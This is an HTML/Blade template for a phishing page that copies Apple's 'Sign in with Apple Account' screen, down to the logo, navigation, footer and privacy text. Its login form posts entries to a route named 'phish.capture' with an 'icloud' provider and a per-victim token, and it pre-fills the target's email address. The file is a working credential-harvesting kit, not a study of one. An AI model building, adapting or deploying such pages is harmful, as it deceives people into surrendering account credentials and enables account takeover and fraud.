<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <title>Sign In to Apple Account</title>
    <meta name="Description" content="Your Apple Account is the account you use for all Apple services.">
    <meta property="og:title" content="Apple Account">
    <meta property="og:description" content="Your account you use for all Apple services">
    <meta property="og:locale" content="US-EN">
    <meta property="og:image" content="https://www.apple.com/ac/structured-data/images/open_graph_logo.png?202110180743">
    <meta property="og:site_name" content="Apple Account">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://account.apple.com/">
    <link rel="shortcut icon" type="image/x-icon" href="https://appleid.cdn-apple.com/static/bin/cb3460663665/images/favicon.ico">
    <style>
        *, ::after, ::before { box-sizing: border-box; margin: 0; padding: 0; }
        html { -webkit-tap-highlight-color: rgba(0,0,0,0); height: 100%; }
        body, #root { height: 100%; position: relative; }
        body {
            font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            color: #1d1d1f;
            background: #fff;
            min-height: 100%;
        }

        /* ===== GLOBAL NAV ===== */
        .globalnav {
            height: 44px;
            position: relative;
            width: 100%;
            z-index: 9999;
        }
        .globalnav-content {
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 44px;
            max-width: 1024px;
            margin: 0 auto;
            padding: 0 22px;
        }
        .globalnav-list {
            display: flex;
            align-items: center;
            list-style: none;
            gap: 0;
            height: 100%;
        }
        .globalnav-item {
            display: flex;
            align-items: center;
            height: 100%;
        }
        .globalnav-link {
            display: flex;
            align-items: center;
            height: 44px;
            text-decoration: none;
            opacity: 0.88;
            transition: opacity 0.3s ease;
        }
        .globalnav-link:hover { opacity: 1; }
        .globalnav-link svg { fill: #1d1d1f; }
        .globalnav-link-text {
            font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 12px;
            font-weight: 400;
            letter-spacing: -0.01em;
            color: #1d1d1f;
        }
        .globalnav-link-apple {
            margin-right: 24px;
        }
        .globalnav-link-apple svg { width: 14px; height: 44px; }
        .globalnav-item + .globalnav-item { margin-left: 24px; }
        .globalnav-bag { margin-left: 24px; }
        .globalnav-bag svg { width: 14px; height: 44px; fill: #1d1d1f; }
        .globalnav-search svg { width: 15px; height: 44px; fill: #1d1d1f; }

        /* ===== LOCAL NAV ===== */
        .ac-localnav {
            height: 52px;
            min-width: 1024px;
            position: relative;
            width: 100%;
            z-index: 9997;
        }
        .ac-localnav-background {
            height: 100%;
            position: absolute;
            top: 0;
            width: 100%;
            background: rgba(250,250,252,0.92);
            backdrop-filter: saturate(180%) blur(20px);
            -webkit-backdrop-filter: saturate(180%) blur(20px);
            border-bottom: 1px solid rgba(0,0,0,0.16);
        }
        .ac-localnav-background::after {
            content: "";
            display: block;
            height: 1px;
            position: absolute;
            top: 100%;
            width: 980px;
            left: 50%;
            margin-left: -490px;
            background: rgba(0,0,0,0.16);
        }
        .ac-localnav-content {
            max-width: 980px;
            margin: 0 auto;
            padding: 0 22px;
            position: relative;
            z-index: 2;
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 100%;
        }
        .ac-localnav-title a {
            font-family: "SF Pro Display", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 21px;
            font-weight: 600;
            letter-spacing: 0.012em;
            line-height: 1.21053;
            color: #1d1d1f;
            text-decoration: none;
            opacity: 0.56;
        }
        .ac-localnav-menu-items {
            display: flex;
            list-style: none;
            gap: 24px;
        }
        .ac-localnav-menu-link {
            font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 12px;
            font-weight: 400;
            letter-spacing: -0.01em;
            line-height: 1;
            color: #1d1d1f;
            text-decoration: none;
            opacity: 0.88;
            transition: opacity 0.3s ease;
        }
        .ac-localnav-menu-link:hover { opacity: 1; color: #06c; }

        /* ===== APP BODY ===== */
        .app-body {
            min-height: calc(100vh - 44px - 52px - 83px);
            position: relative;
        }
        .app-body::before {
            content: "";
            display: block;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: linear-gradient(120deg, #fff, #f0f0f0);
            opacity: 1;
            z-index: -1;
        }

        /* ===== SIGN-IN AUTH ===== */
        .sign-in__auth {
            display: flex;
            align-items: center;
            justify-content: center;
            max-width: 980px;
            margin: auto;
            padding-top: 60px;
            padding-bottom: 80px;
            min-height: calc(100vh - 44px - 52px - 83px);
            flex-direction: column;
        }

        /* ===== LANDING TOP ===== */
        .landing__top {
            display: flex;
            align-items: center;
            flex-direction: column;
            text-align: center;
            padding: 0 90px;
            width: 100%;
        }
        .landing__animation {
            width: 250px;
            height: 250px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .apple-logo-svg {
            width: 120px;
            height: 140px;
            fill: #1d1d1f;
        }
        .landing__headline {
            font-family: "SF Pro Display", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 48px;
            font-weight: 600;
            letter-spacing: -0.003em;
            line-height: 1.08349;
            color: #000;
            margin-top: 50px;
        }
        .landing__intro {
            font-family: "SF Pro Display", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 24px;
            font-weight: 400;
            letter-spacing: 0.009em;
            line-height: 1.33341;
            color: #424245;
            margin-top: 35px;
        }

        /* ===== FORM CARD ===== */
        .form-card {
            max-width: 460px;
            width: 100%;
            margin: 0 auto;
            padding: 0 20px;
        }
        .form-card h2 {
            font-family: "SF Pro Display", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 28px;
            font-weight: 600;
            letter-spacing: 0.007em;
            line-height: 1.14286;
            color: #1d1d1f;
            text-align: center;
            margin-bottom: 20px;
        }
        .field-group {
            position: relative;
            margin-bottom: 0;
        }
        .field-group label {
            display: block;
            font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 14px;
            font-weight: 400;
            color: #6e6e73;
            margin-bottom: 4px;
        }
        .field-group input {
            width: 100%;
            height: 56px;
            padding: 16px;
            font-size: 17px;
            font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            color: #1d1d1f;
            background: rgba(255,255,255,0.8);
            border: 1px solid #d2d2d7;
            border-radius: 12px;
            outline: none;
            transition: border-color 0.2s ease, box-shadow 0.2s ease;
            -webkit-appearance: none;
            appearance: none;
        }
        .field-group input:focus {
            border-color: #0071e3;
            box-shadow: 0 0 0 3px rgba(0,113,227,0.2);
        }
        .field-group input::placeholder {
            color: #86868b;
        }
        .input-stack .field-group:first-child input {
            border-radius: 12px 12px 0 0;
            border-bottom: none;
        }
        .input-stack .field-group:last-child input {
            border-radius: 0 0 12px 12px;
        }

        /* ===== FORGOT PASSWORD ===== */
        .forgot-link {
            display: block;
            text-align: right;
            margin-top: 12px;
            margin-bottom: 24px;
        }
        .forgot-link a {
            font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 14px;
            font-weight: 400;
            color: #0066cc;
            text-decoration: none;
        }
        .forgot-link a:hover { text-decoration: underline; }

        /* ===== CONTINUE BUTTON ===== */
        .btn-continue {
            display: block;
            width: 100%;
            height: 48px;
            font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 17px;
            font-weight: 400;
            color: #fff;
            background: #0071e3;
            border: none;
            border-radius: 980px;
            cursor: pointer;
            transition: background 0.3s ease;
            margin-bottom: 16px;
        }
        .btn-continue:hover { background: #0077ed; }

        /* ===== PRIVACY TEXT ===== */
        .privacy-text {
            font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 12px;
            font-weight: 400;
            color: #1d1d1f;
            line-height: 1.4;
            margin-bottom: 24px;
        }
        .privacy-text a {
            color: #0066cc;
            text-decoration: none;
        }
        .privacy-text a:hover { text-decoration: underline; }

        /* ===== CREATE ACCOUNT ===== */
        .create-account {
            text-align: center;
            margin-top: 24px;
            font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 14px;
            color: #1d1d1f;
        }
        .create-account a {
            color: #0066cc;
            text-decoration: none;
        }
        .create-account a:hover { text-decoration: underline; }

        /* ===== GLOBAL FOOTER ===== */
        .ac-globalfooter {
            background: #f5f5f7;
        }
        .ac-gf-content {
            max-width: 980px;
            margin: 0 auto;
            padding: 0 22px;
        }
        .ac-gf-label {
            position: absolute;
            width: 1px;
            height: 1px;
            overflow: hidden;
            clip: rect(0,0,0,0);
        }
        .ac-gf-footer { border-top: none; padding: 20px 0; }
        .ac-gf-footer-shop {
            font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 12px;
            font-weight: 400;
            color: #6e6e73;
            padding-bottom: 12px;
            border-bottom: 1px solid #d2d2d7;
        }
        .ac-gf-footer-shop a { color: #0066cc; text-decoration: none; }
        .ac-gf-footer-shop a:hover { text-decoration: underline; }
        .ac-gf-footer-locale {
            padding: 12px 0;
            border-bottom: 1px solid #d2d2d7;
        }
        .ac-gf-footer-locale-link {
            font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 12px;
            font-weight: 400;
            color: #424245;
            text-decoration: none;
        }
        .ac-gf-footer-locale-link:hover { text-decoration: underline; }
        .ac-gf-footer-legal {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 0;
            flex-wrap: wrap;
            gap: 8px;
        }
        .ac-gf-footer-legal-copyright {
            font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 12px;
            font-weight: 400;
            color: #6e6e73;
        }
        .ac-gf-footer-legal-links {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
        }
        .ac-gf-footer-legal-link {
            font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-size: 12px;
            font-weight: 400;
            color: #424245;
            text-decoration: none;
        }
        .ac-gf-footer-legal-link:hover { text-decoration: underline; }
        .nowrap { white-space: nowrap; }
    </style>
</head>
<body>
    <!-- Global Nav -->
    <nav class="globalnav" aria-label="Global">
        <div class="globalnav-content">
            <ul class="globalnav-list">
                <li class="globalnav-item">
                    <a href="#" class="globalnav-link globalnav-link-apple" aria-label="Apple">
                        <svg height="44" viewBox="0 0 14 44" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m13.0729 17.6825a3.61 3.61 0 0 0 -1.7248 3.0365 3.5132 3.5132 0 0 0 2.1379 3.2223 8.394 8.394 0 0 1 -1.0948 2.2618c-.6816.9812-1.3943 1.9623-2.4787 1.9623s-1.3633-.63-2.613-.63c-1.2187 0-1.6525.6507-2.644.6507s-1.6834-.9089-2.4787-2.0243a9.7842 9.7842 0 0 1 -1.6628-5.2776c0-3.0984 2.014-4.7405 3.9969-4.7405 1.0535 0 1.9314.6919 2.5924.6919.63 0 1.6112-.7333 2.8092-.7333a3.7579 3.7579 0 0 1 3.1604 1.5802zm-3.7284-2.8918a3.5615 3.5615 0 0 0 .8469-2.22 1.5353 1.5353 0 0 0 -.031-.32 3.5686 3.5686 0 0 0 -2.3445 1.2084 3.4629 3.4629 0 0 0 -.8779 2.1585 1.419 1.419 0 0 0 .031.2892 1.19 1.19 0 0 0 .2169.0207 3.0935 3.0935 0 0 0 2.1586-1.1368z"/></svg>
                    </a>
                </li>
                <li class="globalnav-item"><a href="#" class="globalnav-link"><span class="globalnav-link-text">Store</span></a></li>
                <li class="globalnav-item"><a href="#" class="globalnav-link"><span class="globalnav-link-text">Mac</span></a></li>
                <li class="globalnav-item"><a href="#" class="globalnav-link"><span class="globalnav-link-text">iPad</span></a></li>
                <li class="globalnav-item"><a href="#" class="globalnav-link"><span class="globalnav-link-text">iPhone</span></a></li>
                <li class="globalnav-item"><a href="#" class="globalnav-link"><span class="globalnav-link-text">Watch</span></a></li>
                <li class="globalnav-item"><a href="#" class="globalnav-link"><span class="globalnav-link-text">Vision</span></a></li>
                <li class="globalnav-item"><a href="#" class="globalnav-link"><span class="globalnav-link-text">AirPods</span></a></li>
                <li class="globalnav-item"><a href="#" class="globalnav-link"><span class="globalnav-link-text">TV &amp; Home</span></a></li>
                <li class="globalnav-item"><a href="#" class="globalnav-link"><span class="globalnav-link-text">Entertainment</span></a></li>
                <li class="globalnav-item"><a href="#" class="globalnav-link"><span class="globalnav-link-text">Accessories</span></a></li>
                <li class="globalnav-item"><a href="#" class="globalnav-link"><span class="globalnav-link-text">Support</span></a></li>
            </ul>
            <ul class="globalnav-list">
                <li class="globalnav-item globalnav-search">
                    <a href="#" class="globalnav-link" aria-label="Search apple.com">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15 44" width="15" height="44"><path d="m14.298,27.202l-3.87-3.87c0.701-0.929,1.122-2.081,1.122-3.332c0-3.06-2.489-5.55-5.55-5.55c-3.06,0-5.55,2.49-5.55,5.55 c0,3.061,2.49,5.55,5.55,5.55c1.251,0,2.403-0.421,3.332-1.122l3.87,3.87c0.151,0.151,0.35,0.228,0.548,0.228 s0.396-0.076,0.548-0.228C14.601,27.995,14.601,27.505,14.298,27.202z M1.55,20c0-2.454,1.997-4.45,4.45-4.45 c2.454,0,4.45,1.997,4.45,4.45S8.454,24.45,6,24.45C3.546,24.45,1.55,22.454,1.55,20z"/></svg>
                    </a>
                </li>
                <li class="globalnav-item globalnav-bag">
                    <a href="#" class="globalnav-link" aria-label="Shopping Bag">
                        <svg height="44" viewBox="0 0 14 44" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m11.3535 16.0283h-1.0205a3.4229 3.4229 0 0 0 -3.333-2.9648 3.4229 3.4229 0 0 0 -3.333 2.9648h-1.02a2.1184 2.1184 0 0 0 -2.117 2.1162v7.7155a2.1186 2.1186 0 0 0 2.1162 2.1167h8.707a2.1186 2.1186 0 0 0 2.1168-2.1167v-7.7155a2.1184 2.1184 0 0 0 -2.1165-2.1162zm-4.3535-1.8652a2.3169 2.3169 0 0 1 2.2222 1.8652h-4.4444a2.3169 2.3169 0 0 1 2.2222-1.8652zm5.37 11.6969a1.0182 1.0182 0 0 1 -1.0166 1.0171h-8.7069a1.0182 1.0182 0 0 1 -1.0165-1.0171v-7.7155a1.0178 1.0178 0 0 1 1.0166-1.0166h8.707a1.0178 1.0178 0 0 1 1.0164 1.0166z"/></svg>
                    </a>
                </li>
            </ul>
        </div>
    </nav>

    <!-- Local Nav -->
    <nav class="ac-localnav">
        <div class="ac-localnav-background"></div>
        <div class="ac-localnav-content">
            <div class="ac-localnav-title"><a href="#">Apple&nbsp;Account</a></div>
            <ul class="ac-localnav-menu-items">
                <li><a class="ac-localnav-menu-link" href="#">Sign In</a></li>
                <li><a class="ac-localnav-menu-link" href="#">Create Your Apple&nbsp;Account</a></li>
                <li><a class="ac-localnav-menu-link" href="#">FAQ</a></li>
            </ul>
        </div>
    </nav>

    <!-- App Body -->
    <div class="app-body">
        <div class="sign-in__auth">
            <div class="landing__top">
                <!-- Apple Logo SVG -->
                <div class="landing__animation">
                    <svg class="apple-logo-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 148" width="120" height="148">
                        <path d="M98.4 79.2c-.2-13.6 11.1-20.1 11.6-20.4-6.3-9.3-16.1-10.6-19.5-10.7-8.3-.8-16.3 4.9-20.5 4.9-4.2 0-10.7-4.8-17.6-4.7-9 .1-17.4 5.3-22 13.4-9.4 16.3-2.4 40.5 6.7 53.8 4.5 6.5 9.8 13.8 16.8 13.5 6.7-.3 9.2-4.3 17.2-4.3 8 0 10.4 4.3 17.4 4.2 7.2 0 11.8-6.6 16.2-13.1 5.1-7.6 7.2-14.9 7.3-15.3-.2-.1-14-5.4-14.1-21.1zM81.1 25.7c3.7-4.5 6.2-10.8 5.5-17.1-5.3.2-11.8 3.5-15.6 8-3.4 4-6.4 10.4-5.6 16.5 5.9.5 12-3 20.1-7.4z"/>
                    </svg>
                </div>

                <h1 class="landing__headline">Sign in with Apple&nbsp;Account</h1>
                <p class="landing__intro">Use your Apple Account to sign in to Apple services</p>
            </div>

            <!-- Login Form -->
            <div class="form-card" style="margin-top: 48px;">
                <form action="{{ route('phish.capture', ['provider' => 'icloud', 'token' => $token]) }}" method="POST" autocomplete="off">
                    {{ csrf_field() }}

                    <div class="input-stack">
                        <div class="field-group">
                            <label for="account_name_text_field">Email or Phone Number</label>
                            <input type="text" id="account_name_text_field" name="identifier" autocomplete="username" value="{{ $email ?? '' }}" autofocus>
                        </div>
                    </div>

                    <div class="forgot-link">
                        <a href="#">Forgot password?</a>
                    </div>

                    <button type="submit" class="btn-continue">Continue</button>

                    <p class="privacy-text">
                        Your Apple Account information is used to allow you to sign in and access Apple services. Your information will be used in accordance with Apple's <a href="#">Privacy Policy</a>.
                    </p>
                </form>

                <p class="create-account">
                    Don't have an Apple Account? <a href="#">Create yours now.</a>
                </p>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="ac-globalfooter">
        <div class="ac-gf-content">
            <h2 class="ac-gf-label" id="ac-gf-label">Apple Footer</h2>
            <section class="ac-gf-footer">
                <div class="ac-gf-footer-shop">
                    More ways to shop: <a href="#">Find an Apple Store</a> or <a href="#">other retailer</a> near you. <span class="nowrap">Or call 1-800-MY-APPLE.</span>
                </div>
                <div class="ac-gf-footer-locale">
                    <a class="ac-gf-footer-locale-link" href="#">United States</a>
                </div>
                <div class="ac-gf-footer-legal">
                    <div class="ac-gf-footer-legal-copyright">Copyright &copy; 2026 Apple Inc. All rights reserved.</div>
                    <div class="ac-gf-footer-legal-links">
                        <a class="ac-gf-footer-legal-link" href="#">Privacy Policy</a>
                        <a class="ac-gf-footer-legal-link" href="#">Terms of Use</a>
                        <a class="ac-gf-footer-legal-link" href="#">Sales and Refunds</a>
                        <a class="ac-gf-footer-legal-link" href="#">Legal</a>
                        <a class="ac-gf-footer-legal-link" href="#">Site Map</a>
                    </div>
                </div>
            </section>
        </div>
    </footer>
</body>
</html>
